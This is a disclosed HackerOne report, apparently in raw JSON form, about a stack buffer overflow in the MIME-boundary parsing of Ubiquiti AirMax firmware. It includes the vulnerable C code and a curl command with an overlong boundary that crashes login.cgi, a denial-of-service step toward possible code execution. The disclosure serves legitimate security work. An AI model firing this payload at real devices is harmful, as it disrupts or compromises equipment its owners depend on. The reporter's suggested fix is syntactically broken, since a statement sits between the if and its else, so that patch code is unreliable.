{"id":74004,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDAwNA==","url":"https://hackerone.com/reports/74004","title":"Other Buffer Overflow in PHP of the AirMax Products","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-07-05T12:29:51.207Z","submitted_at":"2015-07-05T12:29:51.207Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"93c08539","url":"/93c08539","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":800,"url":"https://hackerone.com/ui","handle":"ui","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ubiquiti Inc.","twitter_handle":"ubnt","website":"https://ui.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-04-07T21:59:06.653Z","bug_reporter_agreed_on_going_public_at":"2016-03-08T21:58:48.841Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"tldr: Just like happen in Report [73491](https://hackerone.com/reports/73491), but **MUCH WORSE**.\r\n\r\n#The Vulnerability\r\nAfter the Report [73491](https://hackerone.com/reports/73491), I decided to take another look in the code on  files`post.c` and `uploadbuffer.c` (once I have nothing better to do than watch F1).\r\n\r\nThe problematic code:\r\n```\r\nchar *getpost(void) {\r\n/* Some Code */\r\n\tchar *mb;\r\n\tchar boundary[100];\r\n\r\n/* Some Code */\r\n\tif(!strncasecmp(buf,\"multipart/form-data\",19)) {\r\n\t\tfile_upload=1;\r\n\t\tmb = strchr(buf,'=');\r\n\t\tif(mb) strcpy(boundary,mb+1);\t//!!The problematic Line!!\r\n\t\telse {\r\n\t\t\tError(\"File Upload Error: No MIME boundary found\"); \r\n\t\t\t/* Some Code */\r\n\t\t\treturn(NULL);\r\n\t\t}\r\n\t}\r\n/* Rest of the Code */\r\n}\r\n```\r\nHas you can see, it's copied the string in `mb+1` to `boundary` ( witch have a fixed size), so will cause a **Buffer Overflow** if the string in `mb` (here represent `boundary` camp in a POST request) it's bigger than 100 bytes. In a **Buffer Overflow** which happen in stack memory, do a remote code execution should be easy (Even more on a AirMax, once the equipment are almost identical).\r\n\r\n#Reproduce\r\nI will not create a exploit to this report, but unlike the Report [73491](https://hackerone.com/reports/73491), you just have to ask for one.\r\n\r\nThis Curl command will cause a buffer overflow.\r\n```\r\ncurl -X POST -H \"Content-Type: multipart/form-data; boundary=----------------------------dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\" --data-binary AnyDataHERE \"https://192.168.1.20/login.cgi\" -k -v\r\n```\r\nObs: Some times you need a bigger `boundary` (more `d`!!).\r\n\r\nThe lighttpd will return `(mod_cgi.c.1319) cleaning up CGI: process died with signal 11`.","vulnerability_information_html":"\u003cp\u003etldr: Just like happen in Report \u003ca href=\"https://hackerone.com/reports/73491\"\u003e73491\u003c/a\u003e, but \u003cstrong\u003eMUCH WORSE\u003c/strong\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"the-vulnerability\"\u003eThe Vulnerability\u003c/h1\u003e\n\n\u003cp\u003eAfter the Report \u003ca href=\"https://hackerone.com/reports/73491\"\u003e73491\u003c/a\u003e, I decided to take another look in the code on  files\u003ccode\u003epost.c\u003c/code\u003e and \u003ccode\u003euploadbuffer.c\u003c/code\u003e (once I have nothing better to do than watch F1).\u003c/p\u003e\n\n\u003cp\u003eThe problematic code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003echar *getpost(void) {\n/* Some Code */\n    char *mb;\n    char boundary[100];\n\n/* Some Code */\n    if(!strncasecmp(buf,\u0026quot;multipart/form-data\u0026quot;,19)) {\n        file_upload=1;\n        mb = strchr(buf,\u0026#39;=\u0026#39;);\n        if(mb) strcpy(boundary,mb+1);   //!!The problematic Line!!\n        else {\n            Error(\u0026quot;File Upload Error: No MIME boundary found\u0026quot;); \n            /* Some Code */\n            return(NULL);\n        }\n    }\n/* Rest of the Code */\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHas you can see, it\u0026#39;s copied the string in \u003ccode\u003emb+1\u003c/code\u003e to \u003ccode\u003eboundary\u003c/code\u003e ( witch have a fixed size), so will cause a \u003cstrong\u003eBuffer Overflow\u003c/strong\u003e if the string in \u003ccode\u003emb\u003c/code\u003e (here represent \u003ccode\u003eboundary\u003c/code\u003e camp in a POST request) it\u0026#39;s bigger than 100 bytes. In a \u003cstrong\u003eBuffer Overflow\u003c/strong\u003e which happen in stack memory, do a remote code execution should be easy (Even more on a AirMax, once the equipment are almost identical).\u003c/p\u003e\n\n\u003ch1 id=\"reproduce\"\u003eReproduce\u003c/h1\u003e\n\n\u003cp\u003eI will not create a exploit to this report, but unlike the Report \u003ca href=\"https://hackerone.com/reports/73491\"\u003e73491\u003c/a\u003e, you just have to ask for one.\u003c/p\u003e\n\n\u003cp\u003eThis Curl command will cause a buffer overflow.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -X POST -H \u0026quot;Content-Type: multipart/form-data; boundary=----------------------------dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\u0026quot; --data-binary AnyDataHERE \u0026quot;https://192.168.1.20/login.cgi\u0026quot; -k -v\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eObs: Some times you need a bigger \u003ccode\u003eboundary\u003c/code\u003e (more \u003ccode\u003ed\u003c/code\u003e!!).\u003c/p\u003e\n\n\u003cp\u003eThe lighttpd will return \u003ccode\u003e(mod_cgi.c.1319) cleaning up CGI: process died with signal 11\u003c/code\u003e.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-04-07T21:58:48.949Z","allow_singular_disclosure_after":-149157970.0958033,"singular_disclosure_allowed":true,"vote_count":3,"voters":["dyabla","002mastercodex61511","prowser"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":499965,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"#Possible Solution\n```\nchar *getpost(void) {\n/* Some Code */\n    char *mb;\n    char boundary[100];\n\n/* Some Code */\n    if(!strncasecmp(buf,\"multipart/form-data\",19)) {\n        file_upload=1;\n        mb = strchr(buf,'='); //TODO: if character '=' is not found???\n        if(mb) strncpy(boundary,mb+1, sizeof(boundary)); //limit the size to copy\n        boundary[sizeof(boundary) - 1] = 0; //case sizeof(boundary) == strlen(mb+1), it will not allow a open string\n        else {\n            Error(\"File Upload Error: No MIME boundary found\"); \n            /* Some Code */\n            return(NULL);\n        }\n    }\n/* Rest of the Code */\n}\n```\n\nBut I recommend a Complete rework in the `post.c` and `uploadbuffer.c`.","markdown_message":"\u003ch1 id=\"possible-solution\"\u003ePossible Solution\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003echar *getpost(void) {\n/* Some Code */\n    char *mb;\n    char boundary[100];\n\n/* Some Code */\n    if(!strncasecmp(buf,\u0026quot;multipart/form-data\u0026quot;,19)) {\n        file_upload=1;\n        mb = strchr(buf,\u0026#39;=\u0026#39;); //TODO: if character \u0026#39;=\u0026#39; is not found???\n        if(mb) strncpy(boundary,mb+1, sizeof(boundary)); //limit the size to copy\n        boundary[sizeof(boundary) - 1] = 0; //case sizeof(boundary) == strlen(mb+1), it will not allow a open string\n        else {\n            Error(\u0026quot;File Upload Error: No MIME boundary found\u0026quot;); \n            /* Some Code */\n            return(NULL);\n        }\n    }\n/* Rest of the Code */\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut I recommend a Complete rework in the \u003ccode\u003epost.c\u003c/code\u003e and \u003ccode\u003euploadbuffer.c\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-05T14:53:47.499Z","updated_at":"2015-07-05T14:53:47.499Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":502207,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It remains vulnerable on v5.6.1.","markdown_message":"\u003cp\u003eIt remains vulnerable on v5.6.1.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-07T17:56:34.216Z","updated_at":"2015-07-07T17:56:34.216Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":626261,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2015-10-20T15:45:56.578Z","updated_at":"2015-10-20T15:45:56.578Z","actor":{"url":"/ui","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ubiquiti Inc."}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ui","collaborator":{"username":"93c08539","url":"/93c08539"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":626263,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2015-10-20T15:46:27.180Z","updated_at":"2015-10-20T15:46:27.180Z","actor":{"username":"ubnt-james","cleared":false,"url":"/ubnt-james","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"93c08539","url":"/93c08539"},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":627213,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can I request public disclosure of this report and #74025, at the same time that #73480? (around January, Matt stipulated this data). By the way, Matt say something about a CVE of the #73480, it will happen?","markdown_message":"\u003cp\u003eCan I request public disclosure of this report and \u003ca href=\"/reports/74025\"\u003e#74025\u003c/a\u003e, at the same time that \u003ca href=\"/reports/73480\"\u003e#73480\u003c/a\u003e? (around January, Matt stipulated this data). By the way, Matt say something about a CVE of the \u003ca href=\"/reports/73480\"\u003e#73480\u003c/a\u003e, it will happen?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-21T11:02:50.231Z","updated_at":"2015-10-21T11:02:50.231Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":829857,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-08T21:58:48.864Z","updated_at":"2016-03-08T21:58:48.864Z","first_to_agree":true,"actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":895014,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-07T21:59:06.703Z","updated_at":"2016-04-07T21:59:06.703Z","actor":{"url":"/ui","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ubiquiti Inc."}},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}